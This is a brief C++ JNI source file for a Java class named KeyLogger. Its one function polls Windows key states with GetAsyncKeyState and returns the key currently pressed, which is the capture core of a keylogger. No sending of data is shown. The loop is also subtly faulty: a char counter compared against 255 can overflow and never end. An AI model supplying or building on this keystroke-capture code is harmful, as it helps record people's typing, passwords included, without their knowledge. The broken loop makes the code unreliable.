#include <jni.h>
#include <windows.h>
#include <iostream>
#include <thread>

extern "C" {
    JNIEXPORT jchar JNICALL Java_KeyLogger_getKeyPressed(JNIEnv* env, jobject obj) {
        for (char c = 8; c <= 255; c++) {
            if (GetAsyncKeyState(c) & 0x8000) {
                return c;
            }

        }
        return 0;
    }
}